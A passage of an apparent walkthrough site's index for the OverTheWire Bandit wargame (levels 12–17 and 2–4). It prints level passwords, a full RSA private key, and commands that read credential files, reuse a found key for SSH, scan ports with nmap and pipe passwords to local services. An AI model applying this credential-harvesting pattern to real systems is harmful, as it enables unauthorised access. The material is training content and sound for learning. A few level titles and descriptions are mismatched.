\nbandit12@bandit:/tmp/bonzo_otw$ tar -xf data6.bin.out  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al  \ntotal 16  \n-rw-r--r-- 1 bandit12 root 10240 May \u00a07 \u00a02020 data6.bin.out  \n-rw-r--r-- 1 bandit12 root \u00a0\u00a0\u00a079 May \u00a07 \u00a02020 data8.bin\n</code></pre> <p>It's a <code>tar</code> archive. Repeat the steps to untar a <code>tar</code> archive.</p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data8.bin \u00a0  \ndata8.bin: gzip compressed data, was \"data9.bin\", last modified: Thu May \u00a07 18:14:30 2020, max compressi  \non, from Unix  \nbandit12@bandit:/tmp/bonzo_otw$ mv data8.bin data8.gz  \nbandit12@bandit:/tmp/bonzo_otw$ gunzip data8.gz \u00a0  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \ntotal 16  \n-rw-r--r-- 1 bandit12 root 10240 May \u00a07 \u00a02020 data6.bin.out  \n-rw-r--r-- 1 bandit12 root \u00a0\u00a0\u00a049 May \u00a07 \u00a02020 data8\n</code></pre> <p>It's a <code>gzip</code> compressed file. Repeat the steps to unzip a <code>gzip</code>.</p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data8 \u00a0  \ndata8: ASCII text  \nbandit12@bandit:/tmp/bonzo_otw$ cat data8 \u00a0  \nThe password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n</code></pre> <p>This time, we received a file with <code>ASCII text</code> content, allowing us to output the file's contents.The output (with <code>cat</code>) reveals the next level's password. </p>"},{"location":"overthewire/bandit/level12-13/#resources","title":"Resources","text":"Resources <p>Bandit-level13@overthewire xxd manpage @linux.die.net bzip2 manpage @linux.die.net gzip manpage @linux.die.net tar manpage @linux.die.net Hex dump on Wikipedia </p>"},{"location":"overthewire/bandit/level13-14/","title":"Bandit Level 13-14@overthewire.org","text":""},{"location":"overthewire/bandit/level13-14/#description","title":"Description","text":"<p>The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don\u2019t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on.</p>"},{"location":"overthewire/bandit/level13-14/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit13 Password: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw"},{"location":"overthewire/bandit/level13-14/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw ssh -p 2220 bandit13@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level13-14/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1 <p>Learn how to use a <code>private key</code> with <code>ssh</code>. To connect to the host, you will need to use a private ssh key. </p> Solution <pre><code>bandit13@bandit:~$ ls -Al  \ntotal 16  \n-rw-r--r-- 1 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- 1 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a03526 May 15 \u00a02017 .bashrc  \n-rw-r--r-- 1 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0675 May 15 \u00a02017 .profile  \n-rw-r----- 1 bandit14 bandit13 1679 May \u00a07 \u00a02020 sshkey.private\n\nbandit13@bandit:~$ ssh -i sshkey.private -p 2220 bandit14@localhost # (1)\n...\nSNIP\n...\nbandit14@bandit:~$ cat /etc/bandit_pass/bandit14  # (2)\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n</code></pre> <ol> <li>Use the <code>-i</code> flag to specify the private key</li> <li><code>cat</code> out the password. All passwords are located in the <code>/etc/bandit_pass</code> directory</li> </ol> <p><code>ls -al</code> reveals the file <code>sshkey.private</code>.  The file indicates that it is a <code>private ssh key</code>. If we have a private ssh key, we can log in anywhere that has a corresponding public key in the <code>authorized_keys</code> file. To select the <code>private key</code> and connect to the server, add the flag <code>-i</code> to the <code>ssh</code> command. According to the description, the password for the user <code>bandit14</code> is stored in <code>/etc/bandit pass/bandit14</code>.  <code>cat</code> returns the contents of the file, which is the password. </p>"},{"location":"overthewire/bandit/level13-14/#resources","title":"Resources","text":"Resources <p>Bandit-level14@overthewire SSH/OpenSSH/Keys ssh @linux.die.net About creating and using identity keys for key based ssh login @iu.edu</p>"},{"location":"overthewire/bandit/level14-15/","title":"Bandit Level 14-15@overthewire.org","text":""},{"location":"overthewire/bandit/level14-15/#description","title":"Description","text":"<p>The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.</p>"},{"location":"overthewire/bandit/level14-15/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: 14 Password: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq"},{"location":"overthewire/bandit/level14-15/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq ssh -p 2220 bandit14@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level14-15/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2Hint 3 <p>Learn how to connect to a service from the command line. </p> <p>Try <code>nc</code>.</p> <p>If you don't want to copy and paste, brush up on your knowledge of piping.  </p> Solution <pre><code>bandit14@bandit:~$ nc localhost 30000  # (1)\nhaadas  \nWrong! Please enter the correct current password\n\nbandit14@bandit:~$ telnet localhost 30000\n\nTrying 127.0.0.1...  Connected to localhost.  Escape character is '^]'.  \n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e   # (2)\nCorrect!  \nBfMYroe26WYalil77FoDi9qh59eK5xNr  \nConnection closed by foreign host.\n\nbandit14@bandit:~$ cat /etc/bandit_pass/bandit14 | nc localhost 30000  # (3)\nCorrect!  \nBfMYroe26WYalil77FoDi9qh59eK5xNr\n</code></pre> <ol> <li>Checking out the service</li> <li>Using <code>telnet</code> and copy/paste the password</li> <li>The output of <code>cat</code> is sent to <code>nc</code>, which is connecting to the service. We don't need to copy/paste anything. </li> </ol> <p>The description states that a service should be available on port 30000. We can access the service via <code>telnet</code> or <code>nc</code>. We get the password for the new level by entering the current level password after we establish a connection. If you copy/paste the password, <code>telnet</code> is fine but I prefer <code>nc</code> because I can pipe the output of <code>cat</code> to <code>nc</code> using pipes. I was unable to pipe using <code>telnet</code>. <code>nc</code> can also function as a service/listener, but more on that in later lessons. </p> One-liner <p>Bash one-liners can reduce workload, automate something quickly and put the power of ultimate system control in your hands. </p> <p>https://linuxconfig.org/linux-complex-bash-one-liner-examples</p> <pre><code>bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 | nc localhost 30000 | tail -2 | sed '/^$/d'  \nBfMYroe26WYalil77FoDi9qh59eK5xNr\n\nor\n\nbandit14@bandit:~$ echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e | nc localhost 30000 | tail -n 2 | head -n 1\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n</code></pre> <p>Here are some one-liner examples, with <code>cat</code> and <code>echo</code> and <code>sed</code>, <code>head</code> and <code>tail</code>. Try out and replace <code>echo</code> with <code>cat</code>, <code>sed</code> with <code>head</code> and <code>tail</code>. There are numerous possible combinations. </p>"},{"location":"overthewire/bandit/level14-15/#resources","title":"Resources","text":"Resources <p>Bandit-level15@overthewire How to remove empty/blank lines from a file in Unix (including spaces) @serverfault.com? How do I use Head and Tail to print specific lines of a file @stackoverflow.com Localhost on Wikipedia Ports @howstuffworks.com Port (computer networking) on Wikipedia How the Internet works in 5 minutes (YouTube) (Not completely accurate, but good enough for beginners)      IP Addresses @howstuffworks.com IP Address on Wikipedia </p>"},{"location":"overthewire/bandit/level15-16/","title":"Bandit Level 15-16@overthewire.org","text":""},{"location":"overthewire/bandit/level15-16/#description","title":"Description","text":"<p>The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.</p> <p>Helpful note: Getting \u201cHEARTBEATING\u201d and \u201cRead R BLOCK\u201d? Use -ign_eof and read the \u201cCONNECTED COMMANDS\u201d section in the manpage. Next to \u2018R\u2019 and \u2018Q\u2019, the \u2018B\u2019 command also works in this version of that command\u2026</p>"},{"location":"overthewire/bandit/level15-16/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: 15 Password: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt"},{"location":"overthewire/bandit/level15-16/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt ssh -p 2220 bandit15@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level15-16/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2Hint 3 <p>The command <code>openssl</code> implements a client that can establish a transparent connection to a remote server that supports SSL/TLS. </p> <p><code>openssl s_client</code> is a generic SSL/TLS client implementation. What flag should you use to connect to a server? </p> <p>The command <code>openssl s client -connect</code> connects to an SSL server. What are the arguments required to connect to a server? Is the hostname or IP address sufficient?  </p> Solution <pre><code>bandit15@bandit:~$ openssl s_client -connect localhost:30001  # (1)\nCONNECTED(00000003)  depth=0 CN = localhost  \nverify error:num=18:self signed certificate  \nverify return:1  depth=0 CN = localhost  \nverify return:1  \n---  \nCertificate chain  0 s:/CN=localhost  i:/CN=localhost  \n...\n...\n...\n\n\u00a0\u00a0\u00a0Extended master secret: yes  \n---  BfMYroe26WYalil77FoDi9qh59eK5xNr  # (2)\nCorrect!  cluFn7wTiGryunymYOu4RcffSxQluehd  # (3)\n\nclosed\n</code></pre> <ol> <li>Using SSL to connect to a service</li> <li>Entering the current password</li> <li>Obtaining the password for the next level </li> </ol> <p>Use the <code>openssl s client</code> command with the <code>-connect</code> flag to connect to the service over SSL and obtain the password for the next level. After connecting, we enter the password for the current level and receive the password for the following level in return. The <code>openssl</code> command can receive the current level password through a pipe. We can avoid having to copy and paste the password this way. However, in order to maintain the connection and read the response, the <code>openssl</code> command must also include the flag <code>-ign-eof</code>. </p> One-liner <p>Bash one-liners can reduce workload, automate something quickly and put the power of ultimate system control in your hands. </p> <p>https://linuxconfig.org/linux-complex-bash-one-liner-examples</p> <pre><code>echo BfMYroe26WYalil77FoDi9qh59eK5xNr | openssl s_client -ign_eof -connect localhost:30001\n...\n...\n...\nCorrect!  \ncluFn7wTiGryunymYOu4RcffSxQluehd  \n\nclosed\n</code></pre>"},{"location":"overthewire/bandit/level15-16/#resources","title":"Resources","text":"Resources <p>Bandit-level16@overthewire Secure Socket Layer/Transport Layer Security on Wikipedia OpenSSL Cookbook - Testing with OpenSSL Connect to a service over ssl from the linux command line How to send a string to server using s_client @stackoverflow.com openssl @linux.die.net openssl s_client @linux.die.net </p>"},{"location":"overthewire/bandit/level16-17/","title":"Bandit Level 16-17@overthewire.org","text":""},{"location":"overthewire/bandit/level16-17/#description","title":"Description","text":"<p>The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don\u2019t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</p>"},{"location":"overthewire/bandit/level16-17/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: 16 Password: JQttfApK4SeyHwDlI9SXGR50qclOAil1"},{"location":"overthewire/bandit/level16-17/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p JQttfApK4SeyHwDlI9SXGR50qclOAil1 ssh -p 2220 bandit16@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level16-17/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2Hint 3Hint 4Hint 5Hint 5 <p>Use <code>nmap</code> to scan the ports. </p> <p>Use the <code>-sV</code> flag with <code>nmap</code> to identify a <code>SSL</code> port. </p> <p>The command <code>openssl s client -connect</code> connects to an SSL server. What are the arguments required to connect to a server? Is the hostname or IP address sufficient?  </p> <p>You can copy paste the <code>private key</code> and echo it out into a file. The use the <code>-n</code> flag with echo and redirection <code>&gt;</code>.</p> <p>Use <code>chmod</code> to change file permissions </p> <p>If you want to execute only one command on the remote host, you can do it with <code>ssh</code> in one go. </p> Solution <pre><code>bandit16@bandit:~$ nmap -p31000-32000 -sV localhost \u00a0  # (1) \n\nStarting Nmap 7.40 ( https://nmap.org ) at 2022-07-21 22:07 CEST  Nmap scan report for localhost (127.0.0.1)  \nHost is up (0.00030s latency).  \nNot shown: 996 closed ports  \nPORT \u00a0\u00a0\u00a0\u00a0\u00a0STATE \u00a0\u00a0\u00a0SERVICE \u00a0\u00a0\u00a0\u00a0VERSION  31046/tcp open \u00a0\u00a0\u00a0\u00a0echo  31518/tcp filtered unknown  31691/tcp open \u00a0\u00a0\u00a0\u00a0echo  31790/tcp open \u00a0\u00a0\u00a0\u00a0ssl/unknown   # (2) \n31960/tcp open \u00a0\u00a0\u00a0\u00a0echo  1 service unrecognized despite returning data. If you know the service/version, please submit the follow  \ning fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  SF-Port31790-TCP:V=7.40%T=SSL%I=7%D=7/21%Time=62D9B21A%P=x86_64-pc-linux-g   # (3) \nSF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu  \nSF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the  \nSF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea  \n... &lt;SNIP&gt;\n... &lt;SNIP&gt;\n... &lt;SNIP&gt;\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .  \nNmap done: 1 IP address (1 host up) scanned in 90.28 seconds\n</code></pre> <ol> <li>Using nmap for port scan. <code>-p</code> for specifying the ports and <code>-sV</code> for service discovery</li> <li>A port running SSL</li> <li>Some output from the service asking for a password, mentions the port too</li> </ol> <p>To begin, we run a <code>nmap</code> port scan. We use the flag <code>-p</code> and then specify the ports to scan ports <code>31000-32000</code>. We also perform service discovery on those ports using the <code>-sV</code> flag. We notice that the only port that uses <code>SSL</code> is 31790. In addition, you can see in the output that it requests a password. This output also mentions port <code>3179</code>. We are using <code>openssl s_client -connect</code> after identifying the listening port as an <code>SSL</code> port, as we did in the previous level. We get an <code>ssh-key</code> by entering the current level password. </p> <pre><code>bandit16@bandit:~$ openssl s_client -connect localhost:31790  # (1) \nCONNECTED(00000003)  \n\n... &lt;SNIP&gt;\n... &lt;SNIP&gt;\n... &lt;SNIP&gt;\n\n\u00a0\u00a0\u00a0Start Time: 1658434202  Timeout \u00a0\u00a0: 7200 (sec)  Verify return code: 18 (self signed certificate)  Extended master secret: yes  \n---  \ncluFn7wTiGryunymYOu4RcffSxQluehd  \nCorrect!  -----BEGIN RSA PRIVATE KEY-----  # (2) \nMIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ  \nimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ  \nJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu  \nDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW  \nJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX  \nx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD  \nKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl  \nJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd  \nd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC  \nYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A  \nvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama  \n+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT  \n8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx  \nSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd  \nHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt  \nSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A  \nR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi  \nTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg  \nR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu  \nL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni  \nblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU  \nYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM  \n77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b  \ndxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3  \nvBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=  -----END RSA PRIVATE KEY-----  # (3) \n\nclosed\n</code></pre> <ol> <li>connect to service over SSL</li> <li>private key: start copying from here ...</li> <li>... to the end of here</li> </ol> <p>After we obtain the <code>ssh-key</code>, we must save it so that we can use it with <code>ssh</code>. We put it in the writable directory <code>/tmp</code>. Copy the relevant output (from <code>\u2014\u2014-BEGIN RSA PRIVATE KEY\u2014\u2014</code> to <code>\u2014\u2014-END RSA PRIVATE KEY\u2014\u2014</code>) to a new file, <code>echo</code> it and redirect it to the new file. We can use that <code>private key</code> after changing the permission to <code>400</code>. </p> <pre><code>bandit16@bandit:~$ echo -n \"-----BEGIN RSA PRIVATE KEY----- \u00a0\u00a0              \nMIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ \u00a0\u00a0  \nimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ \u00a0\u00a0  \nJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu \u00a0\u00a0  \nDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW \u00a0\u00a0  \nJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX \u00a0\u00a0  \nx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD \u00a0\u00a0  \nKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl \u00a0\u00a0  \nJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd \u00a0\u00a0  \nd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC \u00a0\u00a0  \nYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A \u00a0\u00a0  \nvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama \u00a0\u00a0  \n+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT \u00a0\u00a0  \n8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx \u00a0\u00a0  \nSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd \u00a0\u00a0  \nHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt \u00a0\u00a0  \nSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A \u00a0\u00a0  \nR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi \u00a0\u00a0  \nTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg \u00a0\u00a0  \nR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu \u00a0\u00a0  \nL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni \u00a0\u00a0  \nblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU \u00a0\u00a0  \nYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM \u00a0\u00a0  \n77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b \u00a0\u00a0  \n-----END RSA PRIVATE KEY----- \u00a0\" &gt; /tmp/bonzo.private; chmod 400 /tmp/bonzo.private  # (1) \nbandit16@bandit:~$ ls -al /tmp/bonzo.private  \n-r-------- 1 bandit16 root 1728 Jul 21 22:39 /tmp/bonzo.private\n\nbandit16@bandit:~$ ssh -i /tmp/bonzo.private bandit17@localhost 'cat /etc/bandit_pass/bandit17'  Could not create directory '/home/bandit16/.ssh'.  \nThe authenticity of host 'localhost (127.0.0.1)' can't be established.  \nECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.  \nAre you sure you want to continue connecting (yes/no)? yes  \nFailed to add the host to the list of known hosts (/home/bandit16/.ssh/known_hosts).  \nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames  \n\nVwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e\n</code></pre> <ol> <li>echo out the private key and redirect it to a file</li> <li>connect to the server with ssh and execute the <code>cat</code> command</li> </ol> <p>From previous levels, we know that all of the passwords are in the folder <code>/etc/bandit pass/</code>'. So we connect as <code>bandit17</code> via ssh and <code>cat</code> the password from <code>/etc/bandit pass/bandit17</code> in one go. </p>"},{"location":"overthewire/bandit/level16-17/#resources","title":"Resources","text":"Resources <p>Bandit-level16@overthewire Port scanner on Wikipedia nmap @linux.die.net echo @linux.die.net How to run SSH command and exit @linuxhint.com </p>"},{"location":"overthewire/bandit/level2-3/","title":"Bandit Level 1-2@overthewire.org","text":""},{"location":"overthewire/bandit/level2-3/#description","title":"Description","text":"<p>The password for the next level is stored in a file called <code>-</code> located in the home directory</p>"},{"location":"overthewire/bandit/level2-3/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit2 Password: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi"},{"location":"overthewire/bandit/level2-3/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi ssh -p 2220 bandit2@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested.</p>"},{"location":"overthewire/bandit/level2-3/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1 <p>Look through the links in the Resources section. </p> Solution <pre><code>bandit2@bandit:~$ cat 'spaces in this filename' \u00a0  # (1)\n\nbandit2@bandit:~$ cat \"spaces in this filename\" \u00a0  # (2)\n\nbandit2@bandit:~$ cat spaces\\ in\\ this\\ filename \u00a0# (3)\n</code></pre> <ol> <li>enclosed in single quotes </li> <li>enclosed in double quotes </li> <li>escaped blank spaces in filename</li> </ol> <p>It is necessary to escape blank spaces in filenames with a backslash, <code>\\</code>, in order to read them. For instance, <code>blank\\ space</code>. Alternatively, the filename might be enclosed in single or double quotes like <code>\"blank space.\"</code> or <code>'blank space'</code> </p>"},{"location":"overthewire/bandit/level2-3/#resources","title":"Resources","text":"Resources <p>Bandit-level3@overthewire How to reference filename with spaces in Linux Google Search for \u201cspaces in filename\u201d </p>"},{"location":"overthewire/bandit/level3-4/","title":"Bandit Level 3-4@overthewire.org","text":""},{"location":"overthewire/bandit/level3-4/#description","title":"Description","text":"<p>The password for the next level is stored in a file called spaces in this filename located in the home directory</p>"},{"location":"overthewire/bandit/level3-4/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit3 Password: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG"},{"location":"overthewire/bandit/level3-4/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG ssh -p 2220 bandit3@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level3-4/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>Find out how to switch directories in Linux. Consult the Resources section. </p> <p>Learn about displaying hidden files in Linux. How to differentiate between conventional (non-hidden) files and hidden ones   </p> Solution <pre><code>bandit3@bandit:~$ ls -al\ntotal 24  \ndrwxr-xr-x \u00a03 root root 4096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x 41 root root 4096 May \u00a07 \u00a02020 ..  \n-rw-r--r-- \u00a01 root root \u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- \u00a01 root root 3526 May 15 \u00a02017 .bashrc  \ndrwxr-xr-x \u00a02 root root 4096 May \u00a07 \u00a02020 inhere  \n-rw-r--r-- \u00a01 root root \u00a0675 May 15 \u00a02017 .profile  bandit3@bandit:~$ cd inhere/  bandit3@bandit:~/inhere$ ls -al  # (1)\ntotal 12  \ndrwxr-xr-x 2 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x 3 root \u00a0\u00a0\u00a0root \u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 ..  \n-rw-r----- 1 bandit4 bandit3 \u00a0\u00a033 May \u00a07 \u00a02020 .hidden  \nbandit3@bandit:~/inhere$ cat .hidden \u00a0</code></pre> <ol> <li>use the options <code>-a</code> or <code>-A</code> with <code>ls</code>. Learn what the option <code>-l</code> implies</li> </ol> <p>In Linux, hidden files begin with the dot character <code>.</code> To display them with <code>ls</code>, use the flag <code>-a</code> or <code>-A</code>. An excerpt from the <code>ls</code> man page is provided below. If you are unsure of what options to use with the command, use <code>man</code>. <code>man</code> may be used online or on the terminal, like <code>man ls</code>. For instance, https://linux.die.net/man includes substantial Linux documentation as well as the man pages for all of the terminal commands. </p> <pre><code>-a, --all\n      do not ignore entries starting with .\n\n-A, --almost-all\n      do not list implied . and ..\n</code></pre>"},{"location":"overthewire/bandit/level3-4/#resources","title":"Resources","text":"Resources <p>Bandit-level4@overthewire How to reference filename with spaces in Linux Google Search for \u201cspaces in filename\u201d </p>"},{"location":"overthewire/bandit/level4-5/","title":"Bandit Level 4-5@overthewire.org","text":""},{"location":"overthewire/bandit/level4-5/#description","title":"Description","text":"<p>The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the <code>reset</code> command.</p>"},{"location":"overthewire/bandit/level4-5/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit4 Password: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe"},{"location":"overthewire/bandit/level4-5/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe ssh -p 2220 bandit4@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. 